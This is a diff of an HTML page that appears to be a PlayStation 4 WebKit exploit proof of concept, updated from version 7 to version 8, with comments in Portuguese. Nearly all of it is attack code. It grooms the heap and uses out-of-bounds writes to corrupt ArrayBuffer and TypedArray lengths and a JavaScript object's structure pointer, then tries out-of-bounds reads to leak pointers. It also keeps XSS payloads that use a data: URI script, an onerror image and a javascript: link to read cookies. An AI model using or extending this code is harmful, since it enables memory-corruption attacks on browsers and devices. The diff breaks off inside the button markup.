@@ -2,7 +2,7 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>PS4 WebKit PoC - Speculative Probes v7</title>
+    <title>PS4 WebKit PoC - Controlled Corruption Probes v8</title>
     <style>
         /* Estilos CSS (mantidos) */
         body { background: #111; color: #eee; font-family: monospace; padding: 15px; font-size: 12px; }
@@ -12,18 +12,18 @@
         .log-test { color: #fff; font-weight: bold; margin-top: 10px; display: block; border-top: 1px dashed #555; padding-top: 5px; }
         .log-subtest { color: #eee; font-weight: bold; margin-left: 10px; }
         .log-vuln { color: #ff4444; font-weight: bold; }
-        .log-leak { color: #FF9800; font-weight: bold; } /* Usado para erros/efeitos pós-corrupção */
+        .log-leak { color: #FF9800; font-weight: bold; }
         .log-ptr { color: #f0f; font-weight: bold; }
         .log-good { color: #4CAF50; }
         .log-warn { color: #FFC107; }
         .log-error { color: #f44336; }
-        .log-crash { color: #f0f; font-weight: bold; } /* Usado para indicar alta prob. de crash */
+        .log-crash { color: #f0f; font-weight: bold; }
         .xss-box { border: 2px dotted red; padding: 5px; margin: 5px; color: yellow; }
     </style>
 </head>
 <body>
-    <h1>PS4 WebKit PoC - Speculative Probes v7</h1>
-    <p>Foco: Tentar causar Type Confusion / Efeitos Indiretos via OOB Write em Metadados (Especulativo).</p>
+    <h1>PS4 WebKit PoC - Controlled Corruption Probes v8</h1>
+    <p>Foco: Tentar corrupção controlada (Length, Metadados?) via OOB Write + Grooming.</p>
     <div id="user-agent-info">Recuperando User Agent...</div>
     <div id="controls">
         </div>
@@ -32,164 +32,257 @@
 
     <script>
         let outputDiv = document.getElementById('poc-output');
-        const log = (message, type = 'info') => { /* Função log igual anterior */ if(!outputDiv)return;try{const t=`[${new Date().toLocaleTimeString()}]`;const s=String(message).replace(/</g,"&lt;").replace(/>/g,"&gt;");if(outputDiv.innerHTML.length>500000){outputDiv.innerHTML=outputDiv.innerHTML.substring(outputDiv.innerHTML.length-250000);outputDiv.innerHTML=`<span>[Log Truncado...]</span>\n`+outputDiv.innerHTML;}outputDiv.innerHTML+=`<span class="log-${type}">${t} ${s}\n</span>`;outputDiv.scrollTop=outputDiv.scrollHeight;}catch(e){console.error("Erro log:",e);outputDiv=null;}};
-        const PAUSE_DURATION = 200; // Reduzir pausa geral
-        const SHORT_PAUSE = 30;  // Reduzir pausa curta
+        const log = (message, type = 'info') => { /* ... Função log ... */ if(!outputDiv)return;try{const t=`[${new Date().toLocaleTimeString()}]`;const s=String(message).replace(/</g,"&lt;").replace(/>/g,"&gt;");if(outputDiv.innerHTML.length>500000){outputDiv.innerHTML=outputDiv.innerHTML.substring(outputDiv.innerHTML.length-250000);outputDiv.innerHTML=`<span>[Log Truncado...]</span>\n`+outputDiv.innerHTML;}outputDiv.innerHTML+=`<span class="log-${type}">${t} ${s}\n</span>`;outputDiv.scrollTop=outputDiv.scrollHeight;}catch(e){console.error("Erro log:",e);outputDiv=null;}};
+        const PAUSE_DURATION = 300;
+        const SHORT_PAUSE = 50;
 
-        // --- Coleta de User Agent (igual v4) ---
-        const displayUserAgent = () => { /* ... código igual ao v6 ... */ const ua=navigator.userAgent||"N/A";const d=document.getElementById('user-agent-info');if(d){d.textContent=`User Agent: ${ua}`;}log(`User Agent: ${ua}`,'info');const wm=ua.match(/AppleWebKit\/([0-9.]+)/);if(wm&&wm[1]){log(`Versão WebKit (aprox): ${wm[1]}`,'info');}const pm=ua.match(/(PlayStation 4|PLAYSTATION 4)\/([0-9.]+)/);if(pm&&pm[2]){log(`Versão Firmware PS4 (UA): ${pm[2]}`,'info');}};
+        // --- Coleta de User Agent ---
+        const displayUserAgent = () => { /* ... código igual ao v7 ... */ const ua=navigator.userAgent||"N/A";const d=document.getElementById('user-agent-info');if(d){d.textContent=`User Agent: ${ua}`;}log(`User Agent: ${ua}`,'info');const wm=ua.match(/AppleWebKit\/([0-9.]+)/);if(wm&&wm[1]){log(`Versão WebKit (aprox): ${wm[1]}`,'info');}const pm=ua.match(/(PlayStation 4|PLAYSTATION 4)\/([0-9.]+)/);if(pm&&pm[2]){log(`Versão Firmware PS4 (UA): ${pm[2]}`,'info');}};
 
         // --- Teste 1: XSS (Mantido - Sucesso Confirmado) ---
         const demonstrateXSS_Alert=()=>{log("XSS Alert...","warn");try{alert('XSS Alert!');}catch(e){log(`Alerta bloq: ${e.message}`,'good');}};const demonstrateXSS_DOM=()=>{log("XSS DOM...","warn");try{const t=document.getElementById('xss-target-div');if(t){t.innerHTML='<h2 class="log-vuln">XSS DOM!</h2><img src=x onerror=alert("XSS DOM ONERROR")>';log("DOM Manip OK.",'vuln');}else{log("Alvo DOM ñ enc.","error");}}catch(e){log(`Erro XSS DOM: ${e.message}`,'error');}};const demonstrateXSS_Cookie=()=>{log("XSS Cookie...","warn");try{const c=document.cookie;log(`Cookie: '${c}'`,c?'vuln':'info');}catch(e){log(`Erro Cookie: ${e.message}`,'warn');}};
-        const runCSP_XSS = () => { log("--- T1: CSP Bypass + XSS ---",'test'); try{const pL=`log("[PD] Exec...","warn");try{alert('XSS DataURI');}catch(e){log("[PD] Bloq.","good");}`;const eP=btoa(pL);const s=document.createElement('script');s.src='data:text/javascript;base64,'+eP;s.onerror=()=>{log("ERRO data:!","error");};document.body.appendChild(s);log("Script data: add.",'info');}catch(e){log(`Erro data:: ${e.message}`,'warn');} try{const i=document.createElement('img');i.src='x';i.setAttribute('onerror',"log('onerror!','info');demonstrateXSS_DOM();");document.body.appendChild(i);log("Img onerror add.",'info');}catch(e){log(`Erro onerror: ${e.message}`,'warn');} try{const a=document.createElement('a');a.href="javascript:log('Link JS!','warn');demonstrateXSS_Cookie();";a.textContent="[Clique Teste JS URI]";a.style.cssText='display:block;margin:5px;color:orange;border:1px solid orange;padding:3px;';const h=document.getElementById('js-link-placeholder');if(h)h.replaceWith(a);else document.getElementById('controls').appendChild(a);log("Link JS URI add.",'warn');}catch(e){log(`Erro link JS: ${e.message}`,'warn');} log("--- T1 Concluído ---",'test'); };
+        const runCSP_XSS = () => { log("--- T1: CSP Bypass + XSS ---",'test'); /* ... código igual ao v7 ... */ try{const pL=`log("[PD] Exec...","warn");try{alert('XSS DataURI');}catch(e){log("[PD] Bloq.","good");}`;const eP=btoa(pL);const s=document.createElement('script');s.src='data:text/javascript;base64,'+eP;s.onerror=()=>{log("ERRO data:!","error");};document.body.appendChild(s);log("Script data: add.",'info');}catch(e){log(`Erro data:: ${e.message}`,'warn');} try{const i=document.createElement('img');i.src='x';i.setAttribute('onerror',"log('onerror!','info');demonstrateXSS_DOM();");document.body.appendChild(i);log("Img onerror add.",'info');}catch(e){log(`Erro onerror: ${e.message}`,'warn');} try{const a=document.createElement('a');a.href="javascript:log('Link JS!','warn');demonstrateXSS_Cookie();";a.textContent="[Clique Teste JS URI]";a.style.cssText='display:block;margin:5px;color:orange;border:1px solid orange;padding:3px;';const h=document.getElementById('js-link-placeholder');if(h)h.replaceWith(a);else document.getElementById('controls').appendChild(a);log("Link JS URI add.",'warn');}catch(e){log(`Erro link JS: ${e.message}`,'warn');} log("--- T1 Concluído ---",'test'); };
 
 
-        // --- NOVO Teste 2: Speculative Metadata Corruption v7 ---
-        const runMetadataCorruption_v7 = async () => {
-            log("--- T2: Speculative Metadata Corruption v7 ---", 'test');
-            log("Foco: Escrever OOB em vários offsets e valores, esperando causar Type Confusion ou outros efeitos.", 'warn');
-            log("EXTREMO RISCO DE CRASH!", 'crash');
+        // --- Heap Grooming Simples ---
+        // Tenta alocar muitos buffers, liberar alguns, e alocar atacante/vítima em seguida
+        const simpleGroomHeap = async (logPrefix = "") => {
+            const groomAllocs = [];
+            const groomCount = 300; // Menos alocações que antes, talvez mais rápido
+            const groomSize = 256;
+            const freePattern = 2;
+            log(`${logPrefix} Grooming: Alocando ${groomCount}x${groomSize}B...`, 'info');
+            for (let i = 0; i < groomCount; i++) { groomAllocs.push(new ArrayBuffer(groomSize)); }
+            await new Promise(r => setTimeout(r, SHORT_PAUSE / 2));
+            log(`${logPrefix} Grooming: Liberando 1 a cada ${freePattern}...`, 'info');
+            let freed = 0;
+            for (let i = 0; i < groomCount; i++) { if (i % freePattern === 0) { groomAllocs[i] = null; freed++; } }
+            log(`${logPrefix} Grooming: ${freed} liberados.`, 'info');
+            // Forçar GC é difícil em JS, apenas esperar um pouco
+            await new Promise(r => setTimeout(r, SHORT_PAUSE));
+            // Retornar array para poder limpar depois se necessário (evitar leaks)
+             return groomAllocs;
+        };
 
-            const bufferSize = 64;
-            // Offsets OOB relativos ao FIM do buffer atacante a testar (passo de 4 bytes)
-            const oobWriteOffsets = [];
-            for(let i = -32; i <= 32; i += 4) { oobWriteOffsets.push(i); }
+        // --- NOVO Teste 2: Corrupção de byteLength v8 ---
+        const runByteLengthCorruption_v8 = async () => {
+            log("--- T2: Corrupção de byteLength v8 ---", 'test');
+            log("Foco: Usar OOB Write (Uint8Array) para tentar mudar Vítima.byteLength.", 'warn');
+            log("ALTO RISCO DE CRASH!", 'crash');
 
-            // Valores a escrever (32 bits) - incluindo padrões que podem ser tags ou ponteiros inválidos
-            const corruptionValues = [
-                 0x00000000, 0x00000001, 0xFFFFFFFF, // Básicos
-                 0x41414141, // 'AAAA'
-                 0x80000000, // Limites de inteiro
-                 0x00000002, 0x00000003, 0x00000004, // Small integers (tags?)
-                 // Adicionar outros valores se tiver hipóteses
-            ];
-            // Tipos de vítima
-            const victimFactories = {
-                "ArrayBuffer": () => new ArrayBuffer(128),
-                "Uint32Array": () => new Uint32Array(32), // Mesma memória que AB(128)
-                "Object": () => ({ type: 'victim', id: Math.random(), data: [1,2,3] })
-            };
+            const bufferSize = 128; // Tamanho do atacante e vítima
+            let groomAllocs = null, attackerBuffer = null, victimBuffer = null;
 
-            // Loop principal - Iterar por tudo pode demorar MUITO e crashar cedo
-            // Considerar reduzir o número de offsets/valores/vítimas se demorar demais
-            outerLoop:
-            for (const victimName in victimFactories) {
-                for (const writeOffset of oobWriteOffsets) {
-                    for (const writeValue of corruptionValues) {
-                        // Verificar se outputDiv ainda existe (parar se crash anterior limpou)
-                         if (!outputDiv) { log("Output Div sumiu, parando testes.", "error"); break outerLoop; }
+            try {
+                groomAllocs = await simpleGroomHeap("  [T2]"); // Tentar organizar a heap
 
-                        log(`Testando: OOB W @${writeOffset} val ${writeValue.toString(16)}, Vítima: ${victimName}`, 'subtest');
-                        let victimObj = null;
-                        let attackerBuffer = null;
-                        let attackDataView = null;
-                        let effectDetected = false;
-                        let initialCheck = "N/A";
+                log("  [T2] Alocando Atacante e Vítima (ArrayBuffer)...", 'info');
+                attackerBuffer = new ArrayBuffer(bufferSize);
+                victimBuffer = new ArrayBuffer(bufferSize); // Vítima
+                const attackerViewU8 = new Uint8Array(attackerBuffer);
+                const victimViewU8 = new Uint8Array(victimBuffer); // Para leitura OOB se funcionar
+                 const victimDataView = new DataView(victimBuffer); // Para leitura U64
 
-                        try {
-                            // Alocar logo antes do teste para reduzir interferência
-                            victimObj = victimFactories[victimName]();
-                            attackerBuffer = new ArrayBuffer(bufferSize);
-                            attackDataView = new DataView(attackerBuffer);
-                            //log(`  Atacante e Vítima (${victimName}) alocados.`, 'info');
+                const originalVictimLength = victimBuffer.byteLength;
+                log(`  [T2] Tam. original vítima: ${originalVictimLength}. Tentando escrita OOB...`, 'info');
 
-                            // Realizar escrita OOB (4 bytes)
-                            const absoluteWriteAddr = attackerBuffer.byteLength + writeOffset;
-                            try {
-                                attackDataView.setUint32(absoluteWriteAddr, writeValue, true); // Escrever 32 bits
-                                // log(`  Escrita OOB @${writeOffset} OK.`, 'good');
-                            } catch (e) {
-                                // Logar falha APENAS se não for 'out of bounds', pois isso é esperado
-                                if (!e.message.includes("bounds")) {
-                                     log(`  Escrita OOB @${writeOffset} falhou INESPERADAMENTE: ${e.message}`, 'error');
-                                }
-                                continue; // Pular para próximo se escrita falhar (mesmo que esperado)
-                            }
-                            // NÃO pausar aqui para tentar usar a vítima o mais rápido possível
+                // Onde *achamos* que o byteLength (64 bits) da vítima está.
+                // Suposição: 8 bytes antes do início dos dados da vítima,
+                // e vítima começa logo após o atacante (offset bufferSize).
+                // Offset relativo ao *início* do atacante.
+                const lengthWriteOffset = bufferSize - 8;
+                const newLengthValue64_Hi = 0x0FFFFFFF; // Definir um novo tamanho grande
+                const newLengthValue64_Lo = 0xFFFFFFF8; // Alinhado a 8
 
-                            // Tentar USAR o objeto vítima extensivamente
-                            // log(`  Usando Vítima (${victimName}) pós-OOB...`, 'info');
-                            try {
-                                // Check inicial rápido
-                                initialCheck = `Type: ${typeof victimObj}`;
-                                if (victimObj?.byteLength !== undefined) initialCheck += `, BL: ${victimObj.byteLength}`;
-                                else if (victimObj?.length !== undefined) initialCheck += `, L: ${victimObj.length}`;
-                                //log(`    ${initialCheck}`, 'info');
+                 log(`  [T2] Tentando escrever novo tamanho via OOB (U8) do Atacante @offset ${lengthWriteOffset}...`, 'subtest');
 
-                                // === Bloco de Uso Intensivo ===
-                                // Ações que podem acessar metadados internos ou causar type confusion
-                                let usageResult = '';
-                                if (victimObj instanceof ArrayBuffer) {
-                                    usageResult += `slice:${victimObj.slice(0,0)?.byteLength},`;
-                                    const u8 = new Uint8Array(victimObj); // Criar view
-                                    usageResult += `view[0]:${u8[0]},`;
-                                } else if (ArrayBuffer.isView(victimObj)) {
-                                    usageResult += `[0]:${victimObj[0]},len:${victimObj.length},BL:${victimObj.byteLength},`;
-                                    victimObj.fill(1,0,1); victimObj.slice(0,0);
-                                } else if (victimObj instanceof HTMLElement) {
-                                     usageResult += `tag:${victimObj.tagName},txt:${victimObj.textContent?.length},`;
-                                     document.body.appendChild(victimObj); document.body.removeChild(victimObj);
-                                } else if (typeof victimObj === 'object' && victimObj !== null) {
-                                    usageResult += `keys:${Object.keys(victimObj)?.length},str:${victimObj.toString()?.length},`;
-                                    JSON.stringify(victimObj); // Pode falhar se corrompido
-                                    for(const k in victimObj) { if(victimObj.hasOwnProperty(k)) usageResult+=`${k}:${typeof victimObj[k]},`; }
-                                }
-                                console.log(`Victim usage check`); // Linha mínima para console
-                                // ==============================
+                 // Escrever 8 bytes usando Uint8Array OOB (mais confiável que DataView?)
+                 try {
+                     // Escrever LSB primeiro (Little Endian)
+                     attackerViewU8[lengthWriteOffset + 0] = (newLengthValue64_Lo >> 0) & 0xFF;
+                     attackerViewU8[lengthWriteOffset + 1] = (newLengthValue64_Lo >> 8) & 0xFF;
+                     attackerViewU8[lengthWriteOffset + 2] = (newLengthValue64_Lo >> 16) & 0xFF;
+                     attackerViewU8[lengthWriteOffset + 3] = (newLengthValue64_Lo >> 24) & 0xFF;
+                     attackerViewU8[lengthWriteOffset + 4] = (newLengthValue64_Hi >> 0) & 0xFF;
+                     attackerViewU8[lengthWriteOffset + 5] = (newLengthValue64_Hi >> 8) & 0xFF;
+                     attackerViewU8[lengthWriteOffset + 6] = (newLengthValue64_Hi >> 16) & 0xFF;
+                     attackerViewU8[lengthWriteOffset + 7] = (newLengthValue64_Hi >> 24) & 0xFF;
+                     log("  [T2] Escrita OOB de 8 bytes realizada. Verificando tamanho...", 'vuln');
 
-                                // Check final rápido
-                                let finalCheck = `Type: ${typeof victimObj}`;
-                                if (victimObj?.byteLength !== undefined) finalCheck += `, BL: ${victimObj.byteLength}`;
-                                else if (victimObj?.length !== undefined) finalCheck += `, L: ${victimObj.length}`;
+                     // VERIFICAR TAMANHO DA VÍTIMA
+                     const currentVictimLength = victimBuffer.byteLength;
+                     log(`  [T2] Tamanho ATUAL da vítima: ${currentVictimLength}`, (currentVictimLength !== originalVictimLength) ? 'vuln' : 'info');
 
-                                // Comparar estado
-                                if (initialCheck !== finalCheck) {
-                                    log(`    >> ESTADO MUDOU! Antes: ${initialCheck} / Depois: ${finalCheck}`, 'leak');
-                                    effectDetected = true;
-                                } else {
-                                    //log(`    Uso OK. Estado final: ${finalCheck}`, 'info');
-                                }
+                     if (currentVictimLength !== originalVictimLength && currentVictimLength > bufferSize) {
+                         log("    >> SUCESSO! Tamanho do ArrayBuffer Vítima Corrompido! <<", 'vuln');
+                         // TENTAR LER OOB DA VÍTIMA
+                         const victimReadOffset = originalVictimLength + Math.floor(Math.random() * 64); // Ler um pouco além
+                         try {
+                             log(`    Tentando ler OOB da VÍTIMA @${victimReadOffset}...`, 'info');
+                             const leakedU64Low = victimDataView.getUint32(victimReadOffset, true);
+                             const leakedU64High = victimDataView.getUint32(victimReadOffset + 4, true);
+                             const ptrLike = isPotentialPointer(leakedU64High, leakedU64Low);
+                             log(`    Leitura OOB Vítima (U64): H=${leakedU64High.toString(16)} L=${leakedU64Low.toString(16)}`, ptrLike ? 'ptr' : 'leak');
+                             if(ptrLike) log(`      >> POTENCIAL PONTEIRO VAZADO DA VÍTIMA! <<`, 'vuln');
+                         } catch (e) { log(`    Leitura OOB da Vítima falhou: ${e.message}`, 'warn'); }
+                     } else {
+                         log("    Falha: Tamanho da vítima não mudou ou não aumentou.", 'warn');
+                     }
+                 } catch (e) {
+                     log(`  [T2] Erro ao tentar escrever OOB para tamanho com U8: ${e.message}`, 'error');
+                 }
 
-                            } catch (e) {
-                                log(`    ERRO AO USAR VÍTIMA (EFEITO?): ${e.message}`, 'leak');
-                                effectDetected = true;
-                            }
-                        } catch (e) {
-                            log(`  Erro GERAL: ${e.message}`, 'error');
-                        } finally { victimObj = null; attackerBuffer = null; attackDataView = null; } // GC help
-
-                        if (effectDetected) {
-                           log(`  >>> EFEITO DETECTADO (OOB W @${writeOffset} val ${writeValue.toString(16)}, Vítima: ${victimName}) <<<`, 'vuln');
-                           // Considerar PARAR aqui se um efeito for encontrado para analisar?
-                           // break outerLoop;
-                        }
-                        // Pequena pausa APÓS o teste completo de um caso
-                         await new Promise(r => setTimeout(r, SHORT_PAUSE));
-
-                    } // Fim loop valores
-                } // Fim loop escrita OOB
-            } // Fim loop tipos de vítima
+            } catch (e) { log(`Erro GERAL no Teste 2: ${e.message}`, 'error'); }
+            finally { groomAllocs?.fill(null); attackerBuffer = null; victimBuffer = null; } // GC help
             log("--- T2 Concluído ---", 'test');
         };
 
+        // --- NOVO Teste 3: Corrupção de length de TypedArray v8 ---
+        const runTypedArrayLengthCorruption_v8 = async () => {
+            log("--- T3: Corrupção de length TypedArray v8 ---", 'test');
+            log("Foco: Usar OOB Write para tentar mudar VítimaTypedArray.length.", 'warn');
+            log("ALTO RISCO DE CRASH!", 'crash');
 
-        // --- Teste 3: PP (REMOVIDO) ---
+            const bufferSize = 128; // Tamanho atacante
+            const victimElementCount = 32; // Vítima = Uint32Array(32) -> 128 bytes
+            let groomAllocs = null, attackerBuffer = null, victimTypedArray = null;
 
-        // --- Teste 4: OOB Write Confirm (Mantido - Base) ---
-        const runOOBTestU8_Confirm = async () => { /* ... código igual ao v5 ... */ log("--- T4: OOB Write (Confirmação) ---",'test'); try{const bS=32; const b=new ArrayBuffer(bS); const v=new Uint8Array(b); const wV=0xEE; const wO=[-1,bS,bS+10]; for(const o of wO){ log(`Tentar OOB U8 @${o}...`,'subtest'); try{v[o]=wV;log(`VULN: OOB U8 @${o} OK!`,'vuln');}catch(e){log(`✅ OOB U8 @${o} Bloq: ${e.message}`,'good');} await new Promise(r=>setTimeout(r,SHORT_PAUSE));}}catch(e){log(`Erro T4: ${e.message}`,'error');} log("--- T4 Concluído ---",'test'); };
+            try {
+                groomAllocs = await simpleGroomHeap("  [T3]");
+
+                log("  [T3] Alocando Atacante (AB) e Vítima (Uint32Array)...", 'info');
+                attackerBuffer = new ArrayBuffer(bufferSize);
+                victimTypedArray = new Uint32Array(victimElementCount); // Vítima
+                const attackerViewU8 = new Uint8Array(attackerBuffer);
+
+                const originalVictimElementCount = victimTypedArray.length;
+                log(`  [T3] Comprimento original (elementos) vítima: ${originalVictimElementCount}. Tentando escrita OOB...`, 'info');
+
+                // Onde *achamos* que o campo 'length' (elementos) da vítima pode estar.
+                // Suposição: Perto do byteLength, talvez 16 bytes antes do início dos dados? Totalmente especulativo.
+                const lengthWriteOffset = bufferSize - 16; // CHUTE MUITO ESPECULATIVO
+                const newLengthElements = 0xFFFFFFF; // Novo número de elementos (grande)
+
+                 log(`  [T3] Tentando escrever novo comprimento (${newLengthElements}) via OOB (U8) do Atacante @offset ${lengthWriteOffset}...`, 'subtest');
+
+                 try {
+                     // Escrever 32 bits (tamanho geralmente é 32 ou 64 bits)
+                     attackerViewU8[lengthWriteOffset + 0] = (newLengthElements >> 0) & 0xFF;
+                     attackerViewU8[lengthWriteOffset + 1] = (newLengthElements >> 8) & 0xFF;
+                     attackerViewU8[lengthWriteOffset + 2] = (newLengthElements >> 16) & 0xFF;
+                     attackerViewU8[lengthWriteOffset + 3] = (newLengthElements >> 24) & 0xFF;
+                     // Se fosse 64 bits, escreveria mais 4 bytes aqui...
+                     log("  [T3] Escrita OOB de 4 bytes realizada. Verificando comprimento...", 'vuln');
+
+                     // VERIFICAR COMPRIMENTO DA VÍTIMA
+                     const currentVictimElementCount = victimTypedArray.length;
+                     log(`  [T3] Comprimento ATUAL (elementos) da vítima: ${currentVictimElementCount}`, (currentVictimElementCount !== originalVictimElementCount) ? 'vuln' : 'info');
+
+                     if (currentVictimElementCount !== originalVictimElementCount && currentVictimElementCount > victimElementCount) {
+                         log("    >> SUCESSO! Comprimento do TypedArray Vítima Corrompido! <<", 'vuln');
+                         // TENTAR LER/ESCREVER OOB DA VÍTIMA (via índice)
+                         const victimAccessIndex = originalVictimElementCount + Math.floor(Math.random() * 10);
+                         try {
+                             log(`    Tentando ler/escrever OOB da VÍTIMA no índice ${victimAccessIndex}...`, 'info');
+                             const val = victimTypedArray[victimAccessIndex]; // Leitura OOB
+                             log(`      Leitura OOB[${victimAccessIndex}] retornou: ${val}`, 'leak');
+                             victimTypedArray[victimAccessIndex] = 0xDEADBEEF; // Escrita OOB
+                             log(`      Escrita OOB[${victimAccessIndex}] realizada.`, 'vuln');
+                         } catch (e) { log(`    Acesso OOB índice ${victimAccessIndex} falhou: ${e.message}`, 'warn'); }
+                     } else {
+                         log("    Falha: Comprimento da vítima não mudou ou não aumentou.", 'warn');
+                     }
+                 } catch (e) {
+                     log(`  [T3] Erro ao tentar escrever OOB para comprimento com U8: ${e.message}`, 'error');
+                 }
+
+            } catch (e) { log(`Erro GERAL no Teste 3: ${e.message}`, 'error'); }
+            finally { groomAllocs?.fill(null); attackerBuffer = null; victimTypedArray = null; } // GC help
+            log("--- T3 Concluído ---", 'test');
+        };
+
+        // --- NOVO Teste 4: Corrupção de Map JS Object v8 (Altamente Especulativo) ---
+         const runJSObjectMapCorruption_v8 = async () => {
+            log("--- T4: Corrupção de Map JS Object v8 ---", 'test');
+            log("Foco: Usar OOB Write para tentar mudar Map/Structure Ptr de JS Object.", 'warn');
+            log("EXTREMO RISCO DE CRASH!", 'crash');
+
+            const bufferSize = 128; // Tamanho atacante
+            let groomAllocs = null, attackerBuffer = null, victimObj = null;
+
+            try {
+                groomAllocs = await simpleGroomHeap("  [T4]");
+
+                log("  [T4] Alocando Atacante (AB) e Vítima (Object)...", 'info');
+                attackerBuffer = new ArrayBuffer(bufferSize);
+                victimObj = { check: 1, name: "original", x: 10, y: 20 }; // Objeto vítima simples
+                const attackerViewU8 = new Uint8Array(attackerBuffer);
+
+                log(`  [T4] Vítima original: ${JSON.stringify(victimObj)}. Tentando escrita OOB...`, 'info');
+
+                // Onde *achamos* que o ponteiro do mapa/estrutura (64 bits) pode estar.
+                // Suposição 1: Objeto começa logo após o buffer atacante (offset bufferSize).
+                // Suposição 2: O ponteiro do mapa é o PRIMEIRO campo do objeto (offset 0 relativo à vítima).
+                // Offset relativo ao *início* do atacante.
+                const mapWriteOffset = bufferSize; // CHUTE TOTALMENTE ESPECULATIVO
+                // Valor a escrever - 0, 1, ou um ponteiro inválido pequeno?
+                const newMapValue64_Hi = 0x00000000;
+                const newMapValue64_Lo = 0x00000001; // Tentar escrever 1
+
+                 log(`  [T4] Tentando escrever novo Map Ptr (0x${newMapValue64_Hi.toString(16)}:${newMapValue64_Lo.toString(16)}) via OOB (U8) @offset ${mapWriteOffset}...`, 'subtest');
+
+                 try {
+                     // Escrever 8 bytes
+                     attackerViewU8[mapWriteOffset + 0] = (newMapValue64_Lo >> 0) & 0xFF;
+                     attackerViewU8[mapWriteOffset + 1] = (newMapValue64_Lo >> 8) & 0xFF;
+                     attackerViewU8[mapWriteOffset + 2] = (newMapValue64_Lo >> 16) & 0xFF;
+                     attackerViewU8[mapWriteOffset + 3] = (newMapValue64_Lo >> 24) & 0xFF;
+                     attackerViewU8[mapWriteOffset + 4] = (newMapValue64_Hi >> 0) & 0xFF;
+                     attackerViewU8[mapWriteOffset + 5] = (newMapValue64_Hi >> 8) & 0xFF;
+                     attackerViewU8[mapWriteOffset + 6] = (newMapValue64_Hi >> 16) & 0xFF;
+                     attackerViewU8[mapWriteOffset + 7] = (newMapValue64_Hi >> 24) & 0xFF;
+                     log("  [T4] Escrita OOB de 8 bytes realizada. Tentando usar objeto...", 'vuln');
+
+                     // Tentar usar o objeto e ver se o tipo mudou ou se cracha
+                     try {
+                         log(`    Acessando propriedade 'check': ${victimObj.check}`, 'info');
+                         log(`    Acessando propriedade 'name': ${victimObj.name}`, 'info');
+                         log(`    Chamando toString(): ${victimObj.toString()}`, 'info');
+                         log(`    Verificando typeof: ${typeof victimObj}`, 'info');
+                         log(`    Verificando instanceof Object: ${victimObj instanceof Object}`, 'info');
+                         log(`    SUCESSO NO USO? Objeto parece funcional. Corrupção falhou ou não teve efeito visível.`, 'warn');
+                     } catch (e) {
+                         log(`    ERRO AO USAR OBJETO PÓS-CORRUPÇÃO DE MAP (TYPE CONFUSION?): ${e.message}`, 'leak');
+                         log("     >> POTENCIAL TYPE CONFUSION OU CORRUPÇÃO DE MAP DETECTADA! <<", 'vuln');
+                     }
+
+                 } catch (e) {
+                     log(`  [T4] Erro ao tentar escrever OOB para Map Ptr com U8: ${e.message}`, 'error');
+                 }
+
+            } catch (e) { log(`Erro GERAL no Teste 4: ${e.message}`, 'error'); }
+            finally { groomAllocs?.fill(null); attackerBuffer = null; victimObj = null; } // GC help
+            log("--- T4 Concluído ---", 'test');
+        };
+
+        // --- Teste 5: OOB Write Confirm (Mantido - Base) ---
+        const runOOBTestU8_Confirm = async () => { /* ... código igual ao v7 ... */ log("--- T5: OOB Write (Confirmação) ---",'test'); try{const bS=32; const b=new ArrayBuffer(bS); const v=new Uint8Array(b); const wV=0xEE; const wO=[-1,bS,bS+10]; for(const o of wO){ log(`Tentar OOB U8 @${o}...`,'subtest'); try{v[o]=wV;log(`VULN: OOB U8 @${o} OK!`,'vuln');}catch(e){log(`✅ OOB U8 @${o} Bloq: ${e.message}`,'good');} await new Promise(r=>setTimeout(r,SHORT_PAUSE));}}catch(e){log(`Erro T5: ${e.message}`,'error');} log("--- T5 Concluído ---",'test'); };
+
 
         // --- Função Principal ---
         const runAll = async () => {
              displayUserAgent();
              if (document.getElementById('runAllBtn')) document.getElementById('runAllBtn').disabled = true;
-            log("Iniciando todos os testes (SPECULATIVE PROBES v7)...");
+            log("Iniciando todos os testes (CONTROLLED CORRUPTION PROBES v8)...");
             const tests = [ // Sequência atualizada
-                runCSP_XSS,                     // T1: XSS Base (OK)
-                runMetadataCorruption_v7,       // T2: Speculative Metadata Corruption (NOVO)
-                runOOBTestU8_Confirm,           // T3: OOB Confirm (OK - Renumerado)
+                runCSP_XSS,                         // T1: XSS Base (OK)
+                runByteLengthCorruption_v8,         // T2: ArrayBuffer byteLength Corruption (NOVO)
+                runTypedArrayLengthCorruption_v8,   // T3: TypedArray length Corruption (NOVO)
+                runJSObjectMapCorruption_v8,        // T4: JS Object Map Corruption (NOVO - Especulativo)
+                runOOBTestU8_Confirm,               // T5: OOB Confirm (OK - Renumerado)
             ];
-             for(let i=0; i < tests.length; i++){ /* ... loop igual ao v5 ... */ if(!outputDiv){console.error("Output NULO");break;} try{ log(`--- EXECUTANDO TESTE ${i+1}/${tests.length}: ${tests[i].name} ---`,'test'); const fn=tests[i];const res=fn(); if(res instanceof Promise){await res;} }catch(e){log(`ERRO TESTE ${i+1}: ${e.message} ${e.stack}`,'error');} if(i<tests.length-1&&outputDiv){log(`Pausa ${PAUSE_DURATION}ms...`,'info');await new Promise(r=>setTimeout(r,PAUSE_DURATION));} }
-            if(outputDiv) log("\n\nTodos os testes SPECULATIVE PROBES v7 concluídos.", 'test');
+             for(let i=0; i < tests.length; i++){ /* ... loop igual ao v7 ... */ if(!outputDiv){console.error("Output NULO");break;} try{ log(`--- EXECUTANDO TESTE ${i+1}/${tests.length}: ${tests[i].name} ---`,'test'); const fn=tests[i];const res=fn(); if(res instanceof Promise){await res;} }catch(e){log(`ERRO TESTE ${i+1}: ${e.message} ${e.stack}`,'error');} if(i<tests.length-1&&outputDiv){log(`Pausa ${PAUSE_DURATION}ms...`,'info');await new Promise(r=>setTimeout(r,PAUSE_DURATION));} }
+            if(outputDiv) log("\n\nTodos os testes CONTROLLED CORRUPTION PROBES v8 concluídos.", 'test');
             else console.error("Script concluído, div log NULO.");
              if (document.getElementById('runAllBtn')) document.getElementById('runAllBtn').disabled = false;
         };
@@ -197,8 +290,10 @@
         // Adicionar controles manuais atualizados
         document.getElementById('controls').innerHTML = `
             <button onclick="runCSP_XSS()">Rodar T1 (XSS)</button>
-            <button onclick="runMetadataCorruption_v7()">Rodar T2 (Meta Corruption v7)</button>
-            <button onclick="runOOBTestU8_Confirm()">Rodar T3 (OOB Confirm)</button>
+            <button onclick="runByteLengthCorruption_v8()">Rodar T2 (AB Length Corr v8)</button>
+            <button onclick="runTypedArrayLengthCorruption_v8()">Rodar T3 (TA Length Corr v8)</button>
